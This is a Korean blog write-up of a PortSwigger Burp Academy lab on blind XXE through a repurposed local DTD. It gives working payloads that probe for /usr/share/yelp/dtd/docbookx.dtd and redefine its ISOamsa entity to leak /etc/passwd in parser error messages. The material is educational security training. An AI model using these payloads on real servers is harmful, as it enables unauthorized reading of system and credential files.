---
layout: post
title: "Burp Academy-XXE 취약점: Exploiting XXE to retrieve data by repurposing a local DTD"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XXE injection]
toc: true
last_modified_at: 2024-08-20 21:00:00 +0900
---

# 개요
- 문제 주소: https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd
- 취약점 설명: https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd
- 난이도: EXPERT (어려움)


# 취약점 설명: Exploiting blind XXE by repurposing a local DTD (로컬 DTD를 재활용하여 블라인드 XXE 를 exploit하기)
지금까지의 XXE 테크닉들은 외부(external) DTD에서는 잘 작동하지만, `DOCTYPE` 요소 내에서 정의된 내부 DTD에서는 일반적으로 작동하지 않는다. 이는 이 테크닉이 다른 파라메터 엔터티의 정의 내부에서 XML 파라메터 엔티티를 사용하기 때문이다. XML 사양에 따르면, 이러한 재정의는 외부 DTD에서는 허용되지만 내부 DTD에서는 허용되지 않는다. (일부 파서는 이를 허용하는 경우도 있다.)

그렇다면 Out-of-bound 통신이 차단되었을 때 블라인드 XXE 취약성은 어떻게 찾을까? Out-of-bound 통신으로 데이터를 빼낼 수도 없고, 원격 서버를 통해 외부 DTD를 로드할 수도 없다. 

이런 상황에서도, XML 언어 사양의 허점으로 인해 민감한 데이터가 포함된 오류 메시지를 트리거할 수 있는 경우가 있다. **만약 문서의 DTD가 내부 및 외부 DTD 선언을 동시에 사용하는 하이브리드 타입인 경우, 내부 DTD는 외부 DTD에서 선언된 엔터티를 재정의할 수 있다.** 이런 경우 다른 파라메터 엔터티의 정의 내에서 XML 파라메터 엔터티를 사용하는 것에 대한 제한이 완화된다. 

즉, 공격자는 내부 DTD 내에서 오류 기반 XXE 테크닉을 사용할 수 있으며, 이 때 XML 파라메터 엔터티가 외부 DTD 내에서 선언된 엔터티를 재정의한다. 물론 out-of-band 연결이 차단된 경우 외부 DTD를 리모트 서버에서 로드할 수 없다. 대신 애플리케이션 서버의 로컬 경로에 외부 DTD 파일이 있어야 한다. 근본적으로 이 공격은 로컬 파일 시스템에 있는 DTD 파일을 호출하고, 기존 엔터티를 재정의함으로써 구문 분석 오류를 트리거하여 민감한 데이터를 노출시킨다. 이 테크닉은 Arseniy Sharoglazov가 개척했으며 2018년 상위 10개 웹 해킹 기술에서 7위를 차지했다. 

예를 들어, `/usr/local/app/schema.dtd` 위치에 있는 서버 파일 시스템에 DTD 파일이 있고, 이 DTD 파일이 `custom_entity` 라는 엔티티를 정의한다고 하자. 공격자는 다음과 같은 하이브리드 DTD를 제출하여 `/etc/passwd` 파일의 내용이 포함된 XML 구문 분석 오류 메시지를 트리거할 수 있다.

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

위는 HTML인코딩이 두 번 들어가 있다. (밸리데이션 체크를 우회하기 위해서인 것으로 보인다.) HTML 디코딩해서 조금 더 보기 쉽게 바꾸면 다음과 같다. (HTML 디코딩에서 `&#x26;`은 `&`로, `&#x25;`는 `%`로 디코딩된다. `&#x27;`는 `'`이다.)

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
'>
%local_dtd;
]>
```

이 DTD는 다음 스텝을 수행한다. 

- `local_dtd` 라는 XML 매개변수 엔티티를 정의한다. 이 엔티티는 서버 파일 시스템에 존재하는 외부 DTD 파일의 내용을 포함한다. 
- 외부 DTD 파일에 이미 정의된 `custom_entity` 라는 XML 파라메터 엔티티를 재정의한다. 이 엔티티는 `/etc/passwd` 파일의 내용을 포함하는 오류 메세지를 트리거하기 위해 오류 기반 XXE 익스플로잇을 포함하도록 재정의된다. 
- `local_dtd` 엔티티를 사용하여 `custom_entity` 엔티티의 재정의된 값을 포함하여 외부 DTD가 해석되도록 한다. 그러면 원하는 오류 메시지가 생성된다. 

## 기존 DTD 파일을 찾아 재활용하기 (Locating an existing DTD file to repurpose)
이 XXE 공격은 서버 파일 시스템에서 기존 DTD를 재활용하는 것을 포함하므로 핵심 요구 사항은 적합한 파일을 찾는 것이다. 이는 매우 간단하다. 애플리케이션이 XML 파서에서 발생한 오류 메시지를 반환하기 때문에 내부 DTD 내에서 로드하려고 시도하는 것만으로 로컬 DTD 파일의 존재를 알 수 있다. 

예를 들어, GNOME 데스크톱 환경을 사용하는 Linux 시스템은 종종 `/usr/share/yelp/dtd/docbookx.dtd` 경로에 DTD 파일을 가지고 있다. 다음 XXE 페이로드를 제출하여 이 파일이 있는지 테스트할 수 있다. 파일이 없으면 오류가 발생한다. 

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

일반적인 DTD 파일 목록을 테스트하여 존재하는 파일을 찾은 후에는 파일의 사본을 얻어서 내용을 확인하여 재정의할 수 있는 엔터티를 찾아야 한다. DTD 파일을 포함하는 많은 시스템이 오픈 소스이므로 대부분 인터넷 검색을 통해 파일의 내용을 알 수 있다. 

# 랩 개요
- 이 랩에서는 "Check stock" 기능을 통해 XML 을 삽입할 수 있다.그러나 결과를 볼 수는 없다. 
- 문제를 풀려면 에러를 발생시켜 에러 메세지에 /etc/passwd 파일의 내용을 포함하도록 한다. 
- 당신은 서버에 존재하는 DTD파일을 참조하여, 그 안에 있는 엔터티를 재정의할 필요가 있다. 
- 힌트: GNOME 데스크톱 환경을 사용하는 시스템은 종종 /usr/share/yelp/dtd/docbookx.dtd에 ISOamso라는 엔티티를 포함하는 DTD를 갖고 있다. 

```
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

Hint
Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.
```

# 도전 
1. 재고 체크하는 API `POST /product/stock` 의 바디가 XML로 되어 있다. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```


2. 파일 `/usr/share/yelp/dtd/docbookx.dtd`의 내용을 얻어내는 다음 페이로드를 보내본다. 

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

그러면 다음과 같은 응답이 되돌아 온다. 파일의 XML 구성에 문제가 있는 것으로 보인다. 

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 117

"XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 4; columnNumber: 3; Premature end of file."
```

참고로 존재하지 않는 경로를 지정하면 다음과 같은 응답이 돌아온다. 이를 통해  `/usr/share/yelp/dtd/docbookx.dtd` 파일은 존재한다는 것을 확신할 수 있다. 

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///non-existence">
%local_dtd;
]>
```

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 105

"XML parser exited with error: java.io.FileNotFoundException: /non-existence (No such file or directory)"
```

3. 에러를 통해 /etc/passwd의 내용을 알아낼 수 있는 다음 페이로드를 보내본다. 

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

응답은 다음과 같다. 동일한 에러 메세지다. docbookx.dtd 파일 자체에 문제가 있는데, 이 것을 어떤 방법을 사용해서 exploit할 필요가 있어 보인다...

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 118

"XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 10; columnNumber: 3; Premature end of file."
```

4. 아.. 생각해보니 `custom_entity`부분을 `/usr/share/yelp/dtd/docbookx.dtd`에 존재하는 엔터티명으로 변경해야 한다고 했다. `docbookx.dtd`는 구글 검색하면 내용을 알 수 있을 것이다. 

[github](https://github.com/GNOME/yelp/blob/master/data/dtd/docbookx.dtd)에서 찾을 수 있었다. 확인해보면 엔티티 `ISOamsa`, `ISOamsb`, `ISOamsc` 등이 존재하는 것을 알 수 있다.  


5. 페이로드를 다음과 같이 변경해서 보내본다. 

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

그러면 다음과 같이 /etc/passwd의 내용이 회신되는 것을 볼 수 있다. XXE 인젝션에 성공했다! 🍔

![](/images/burp-academy-xxe-9-1.png)

그리고 문제가 풀렸다는 메세지가 출력된다. 

![](/images/burp-academy-xxe-9-success.png)